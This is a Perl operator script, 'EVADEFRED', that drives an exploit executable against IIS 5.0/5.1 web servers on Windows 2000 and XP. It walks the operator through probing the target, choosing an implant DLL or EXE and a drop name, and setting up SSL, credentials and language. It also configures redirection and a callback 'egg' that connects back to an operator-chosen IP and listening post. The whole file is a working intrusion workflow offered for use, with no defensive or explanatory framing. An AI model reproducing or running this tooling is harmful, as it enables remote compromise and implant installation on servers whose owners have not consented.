
use strict;
use vars qw($VERSION);

$::VERSION = "EVADEFRED Script: 3.2.0";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);

my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA	= "Resources\\Tools\\ridearea2.exe";	
$::RPCTOUCH	= "Resources\\Tools\\rpctouch.exe";		

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";			
$::EXPLOIT_EXE	= "$opts{e}\\EVFR.exe";					

$::EGG_SOCKET_NONE			= "1";			
$::EGG_SOCKET_NEW			= "2";			
$::EGG_SOCKET_REUSE			= "3";			

$::IMPLANT_SOCKET_NONE		= "1";
$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			
$::RUN_PROBE_2				= "3";			


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);

my	$logfile_prefix		= "EVFR_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 80;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName	= "N/A";			

my	$EggSocketStatus	= $::EGG_SOCKET_REUSE;	

my	$ExternalRideArea	= 0;				
my	$RA_Payload			= "N/A";

my $TransProt_none		=0;
my $TransProt_tcp		=1;
my $TransProt_udp		=2;
my $TargetTransportProtocol	= $TransProt_none;		
my $TransportProtocol = "undefined";

my $AppProt_none	= 0;
my $AppProt_NA		= 1;
my $AppProt_nbt		= 2;
my $AppProt_smb		= 3;
my $AppProt_smtp	= 4;
my $AppProt_pop		= 5;
my $AppProt_http	= 6;
my $AppProt_ftp		= 7;
my $AppProt_telnet	= 8;
my $AppProt_imap	= 9;
my $TargetApplicationProtocol = $AppProt_none;				
my $ApplicationProtocol	= "undefined";	

my $RpcConnection =  "";									


my $Hostname;
my $Language		= 0;
my $OS;
my $path;
my $username;
my $password;
my $authtype		= 0;
my $sslFlag		= 0;
my $BackupCBPort	= 1390;
my $EggCallbackIp	= "undefined";
my $EggCallbackPort;

&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");



($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea, $Hostname, $OS, $Language, $path, $username, $password, $authtype, $sslFlag, $BackupCBPort, $EggCallbackIp, $EggCallbackPort ) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType,
	$PayloadDropName, $TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea);


my $flags = "";
if ($sslFlag) {
  $flags = " -S";
}



&EU_Log(1, "\nAll web requests (including our probes) are logged by IIS.");
&EU_Log(1, "The HTTP verb for this probe is OPTIONS and the expected response code is 200 (OK).");
my $retcode = &EU_GetInput("\nDo you want to probe the target ([y],n)? ", "y");
if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { 
	
	&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" $flags -r $::RUN_PROBE_1	-i $TargetIp -p $TargetPort -o $TimeOutValue -a $path -U $username -W $password -A $authtype -H $Hostname -c 3 -b 1 -f NA");
}

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}


if ($ExternalRideArea == 1) {


	my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
	my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

	$year += 1900;
	$mon  += 1;

	$RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);


	if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m");	
			}
		}
	}
}






&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


my $ImplantPayload = "N/A";
if ($ExternalRideArea == 1) {
	$ImplantPayload = $RA_Payload;
}
else {
	$ImplantPayload = $PayloadFile;
}

if ($ExternalRideArea == 1) {
	&EU_RunCommand("start \"EVFR Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" $flags -r $OS	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus	 -H $Hostname -a $path -U $username -W $password -A $authtype -f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" -z -o $TimeOutValue -t $TargetTransportProtocol -b 1 -L $Language -I $EggCallbackIp -P $EggCallbackPort -B $BackupCBPort\"");
}
else {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("start \"EVFR Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" $flags -r $OS	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus	 -H $Hostname -a $path -U $username -W $password -A $authtype -f \"$ImplantPayload\" -x $PayloadType -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b 1 -L $Language -I $EggCallbackIp -P $EggCallbackPort -B $BackupCBPort\"");
	}
	else {
		&EU_RunCommand("start \"EVFR Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" $flags -r $OS	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus	 -H $Hostname -a $path -U $username -W $password -A $authtype -f \"$ImplantPayload\" -x $PayloadType -q $PayloadDropName -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b 1 -L $Language -I $EggCallbackIp -P $EggCallbackPort -B $BackupCBPort\"");
	}
}


my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");



sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	   $TimeOutValue,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $callbackFlag 		= 0;
	my $OrgTargetIp			= $TargetIp;
	my $LPRedirectionIp		= "127.0.0.1";
	my $LPRedirectionPort	= "undefined";
	my $DestinationIp		= $TargetIp;
	my $DestinationPort		= 80;
	my $TransportProtocolSelected = 0;
	my $RideAreaOpt			= "Exploit called";

	my ($LocalIp);

	my $EggCallbackIp;
	my $EggCallbackPort;

	my $RpcTouchProtocol			= "undefined";

	
	my $hostname;
	my $os;
	my $osstring;
	my $lang		= 0;
	my $path		= "/";
	my $auth		= "n";
	my $authtype	= 0;
	my $username	= "undefined";
	my $password	= "undefined";
	my $dolang		= "n";
	my $sslFlag		= 0;
	my $BackupCBPort	= 1390;

	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 



		&EU_Log(1,"\nRideArea option:\n");
		&EU_Log(1,"   0) Have exploit call RideArea [DEFAULT]");		
		while(1) {
			$ExternalRideArea = &EU_GetInput("\nEnter selection [0]: ", $ExternalRideArea);
			&EU_Log(0, "\nEnter selection [0]: $ExternalRideArea");

			if($ExternalRideArea eq "0") {
				$RideAreaOpt = "Exploit called";
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 

		$retcode = &EU_GetInput("\nSend exploit using SSL (port 443 open) (y,[n])? ", "n");
		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { 
			$sslFlag = 1; 
			$DestinationPort = 443;
		}
		else { $sslFlag = 0; }

		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$EggCallbackIp = $LocalIp;
			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");
			$DestinationIp = $TargetIp;

			$DestinationPort = &EU_GetPort("\nEnter the target Port", $DestinationPort);
			&EU_Log(0, "Enter the target Port:  $DestinationPort");
			$TargetPort = $DestinationPort;

			&EU_Log(1, "\nIf the egg is unable to find a socket to re-use, it may be desirable for it");
			&EU_Log(1, "to create a new socket in order to connect back. ");
			$retcode = &EU_GetInput("\nDo you want to have a backup callback socket ([y],n)? ", "y");

			if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") )
			{
				$callbackFlag = 1;

				&EU_Log(1, "\nEnter the location for the egg to call back to if the exploit");
				&EU_Log(1, "is unable to find the old socket to re-use.");
				$EggCallbackIp = &EU_GetLocalIP("\nEnter the IP address for the egg to call back to", $EggCallbackIp);
				&EU_Log(0,"\nEnter the IP address for the egg to call back to: $EggCallbackIp"); 

				$BackupCBPort = &EU_GetPort("\nEnter the port for the egg to call back to", $BackupCBPort);
				&EU_Log(0, "Enter the backup callback port:  $BackupCBPort");
				$EggCallbackPort = $BackupCBPort;
			}
			else
			{
				$EggCallbackIp = "undefined";
				$EggCallbackPort = 0;
			}	

		}

		else {


			$LPRedirectionIp = &EU_GetIP("\nEnter the LP Redirection IP address", $LPRedirectionIp);
			&EU_Log(0, "Enter the LP Redirection IP address:  $LPRedirectionIp");
			$TargetIp = $LPRedirectionIp;

			$LPRedirectionPort = $DestinationPort * 10;
			$LPRedirectionPort = &EU_GetPort("Enter the LP Redirection Port", $LPRedirectionPort);
			&EU_Log(0,"Enter the LP Redirection Port: $LPRedirectionPort");
			$TargetPort = $LPRedirectionPort;

			&EU_Log(1, "\nIf the egg is unable to find a socket to re-use, it may be desirable for it");
			&EU_Log(1, "to create a new socket in order to connect back. ");
			$retcode = &EU_GetInput("\nDo you want to have a backup callback socket ([y],n)? ", "y");

			if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") )
			{
				$callbackFlag = 1;

				&EU_Log(1, "\nThis is the backup callback port that we will listen on for the egg to");
				&EU_Log(1, "call back to if it cannot find the old socket to re-use.");
				$BackupCBPort = &EU_GetPort("Enter the backup callback port", $BackupCBPort);
				&EU_Log(0, "Enter the target Port:  $BackupCBPort");

				&EU_Log(1, "\nNext, enter the location for the egg to call back to if the exploit");
				&EU_Log(1, "is unable to find the old socket to re-use.");
				&EU_Log(1, "The redirection should already be set up.");
				$EggCallbackIp = &EU_GetIP("\nEnter the IP address for the egg to call back to", $EggCallbackIp);
				&EU_Log(0,"\nEnter the IP address for the egg to call back to: $EggCallbackIp");

				$EggCallbackPort = &EU_GetPort("\nEnter the port for the egg to call back to", $EggCallbackPort);
				&EU_Log(0, "Enter the redirector listening port:  $EggCallbackPort");
			}
			else
			{
				$EggCallbackIp = "undefined";
				$EggCallbackPort = 0;
			}	

		}


		&EU_Log(1, "\nWhat socket model do you want to use?");
		if (	$sslFlag == 1 ) {
			&EU_Log(1, " [2]  Send exploit and implant in one shot");
			&EU_Log(1, "\nFor SSL, #2 is required.");
			$retcode = &EU_GetInput("\nEnter selection [2]: ", 2);
			&EU_Log(0, "\nEnter selection [2]: $retcode");
		} else {
			&EU_Log(1, "[1] Exploit will call back to retrieve the implant");
			&EU_Log(1, " 2  Send exploit and implant in one shot");
			&EU_Log(1, "\nIf you're unsure, you probably want #1."); 
			$retcode = &EU_GetInput("\nEnter selection [1]: ", 1);
			&EU_Log(0, "\nEnter selection [1]: $retcode");
		}

		if ($retcode == 1) {
			$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
			&EU_Log(1,"The exploit socket connection will be used for the duration of the operation,\nincluding the PEDDLECHEAP connection with the Listening Post.\n");
		} elsif($retcode == 2) {
			$ImplantSocketStatus = $::IMPLANT_SOCKET_NONE;
			&EU_Log(1, "The exploit and implant will be sent as one.\nThe implant must create its own socket.");
		} else {
			&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
			next;
		}


		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}


		&EU_Log(1, "\nEnter the value to be used in the Host: HTTP header.");
		&EU_Log(1, "Type 'IP' to use the target's IP address.");
		&EU_Log(1, "Type 'more' to see more info about what this value should be.");
		$hostname = &EU_GetInput("Host: header (default is 'www')? ", "www");

		while ($hostname eq "more") {
			&EU_Log(1, "\nIn a default IIS installation, it doesn't matter what this field is, so long");
			&EU_Log(1, "as it contains only alphanumeric characters and is less than 256 bytes long.");
			&EU_Log(1, "For a machine hosting multiple sites, the name is important, and must match");
			&EU_Log(1, "one site's DNS name.  Firewalls and proxies may also examine this value.");
			&EU_Log(1, "\nA good heuristic is to do a reverse DNS lookup of the IP address and use that");
			&EU_Log(1, "as the Host: header.");
			$hostname = &EU_GetInput("(default is 'www')", "www");
		}

		if ($hostname eq "IP") {
			$hostname = $OrgTargetIp;
		}


		$path = &EU_GetInput("\nUrl path for the exploit to use? [$path] ", $path);

		$auth = &EU_GetInput("\nIs authentication required? (y, [n]) ", "n");
		if( ($auth eq "y") or ($auth eq "yes") or ($auth eq "Y") or ($auth eq "YES") ) {
			&EU_Log(1, "\n1) Basic");
			&EU_Log(1, "2) NTLM");
			$authtype = &EU_GetInput("Choose an authentication type: [1] ", 1);


			$username = &EU_GetInput("\nEnter the username: [$username] ", $username);
			$password = &EU_GetInput("\nEnter the password: [$password] ", $password);
		}



		if (   $ImplantSocketStatus == $::IMPLANT_SOCKET_MAINTAIN 
			&& $sslFlag == 1
			)
		{
			&EU_Log(1,"\nIs the target:\n\t[1.] Windows 2000 (warning: Combining SSL and callback for implant not supported)\n");
		}
		else
		{
			&EU_Log(1,"\nIs the target:\n\t[1.] Windows 2000\n");
		}


		if ($ImplantSocketStatus == $::IMPLANT_SOCKET_MAINTAIN && $sslFlag == 1)
		{
			&EU_Log(1,"\t 2.  Windows XP (warning: Combining SSL and callback for implant not supported)\n");
		}
		else
		{
			&EU_Log(1,"\t 2.  Windows XP\n");
		}

		$os = &EU_GetInput("?", 1);
		if ($os == 1) { $osstring = "Windows 2000"; }
		if ($os == 2) { $osstring = "Windows XP"; $os = 4; }

		if ($os == 1)
		{
			&EU_Log(1, "\nDo you want to specify a language?");
			$dolang = &EU_GetInput("(Only select this option if the exploit has failed once before.) (y, [n]) ", "n");
		}

		if ($os == 4)
		{
			$dolang = "y";
		}

		if ($dolang eq "y" or $dolang eq "Y") 
		{
			&EU_Log(1, "\nAll web requests (including our probes) are logged by IIS.");
			&EU_Log(1, "The HTTP verb for this probe is GET and the expected response code is 400 (Bad Request).");
			$retcode = &EU_GetInput("\nProbe the target now to determine language ([y], n)? ", "y");
			if ($retcode eq "y" or $retcode eq "Y") {
				my $Flags = "";
				if ($sslFlag) { $Flags = "-S"; }
				&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" $Flags -r $::RUN_PROBE_2	-i $TargetIp -p $TargetPort -o $TimeOutValue -H $hostname -a $path -U $username -W $password -A $authtype -c 3 -b 1 -t 1 -f NA");
			}

			$lang = 0;
			&EU_Log(1, "\t1) Traditional Chinese");
			&EU_Log(1, "\t2) Simplified Chinese");
			&EU_Log(1, "\t3) Korean");
			&EU_Log(1, "\t4) Japanese");
			&EU_Log(1, "\t5) German");
			&EU_Log(1, "\t6) Italian");
			&EU_Log(1, "\t7) English");
			&EU_Log(1, "\t8) French");
			&EU_Log(1, "\t9) Spanish/Dutch");
			&EU_Log(1, "\t10) Brazilian Portuguese");
			&EU_Log(1, "\t11) Iberian Portuguese (Portugal)");
			&EU_Log(1, "\t12) Russian/Danish");
			&EU_Log(1, "\t13) Swedish");
			&EU_Log(1, "\t14) Norwegian/Finnish/Turkish");
			&EU_Log(1, "\t15) Hebrew");
			&EU_Log(1, "\t16) Arabic");
			&EU_Log(1, "\t17) Czech");
			&EU_Log(1, "\t18) Greek");
			&EU_Log(1, "\t19) Hungarian/Polish");
			&EU_Log(1, "\t20) (unsupported)");
			while ($lang == 0) {
				$lang = &EU_GetInput("Select the target language: ", 0);
			}
		}


		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
			if( $callbackFlag )
			{
				&EU_Log(1,"\tBackup Egg Callback IP: $EggCallbackIp");
				&EU_Log(1,"\tBackup Egg CB Port    : $EggCallbackPort");
			}
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		if ($os == 4) {
			&EU_Log(1,"\tTarget Platform       : Windows XP (IIS 5.1)");
			&EU_Log(1,"\tLanguage              : $lang");
		} else {
			&EU_Log(1,"\tTarget Platform       : Windows 2000 (IIS 5.0)");
			if ($lang) {
				&EU_Log(1,"\tLanguage              : $lang");
			}
		}  

		&EU_Log(1,"\tHostname              : $hostname");

		&EU_Log(1,"\tPath                  : $path");
		
		if ($authtype > 0) {
			if ($authtype == 1)	{
				&EU_Log(1,"\tAuthentication        : Basic");
			} elsif ($authtype == 2) {
				&EU_Log(1, "\tAuthentication       : NTLM");
			}
			&EU_Log(1, "\tCredentials           : $username:$password");
		}
		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last; 
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}


	} 


	return ($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
			$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea, $hostname, $os, $lang, $path, $username, $password, $authtype, $sslFlag, $BackupCBPort, $EggCallbackIp, $EggCallbackPort);
}



__END__



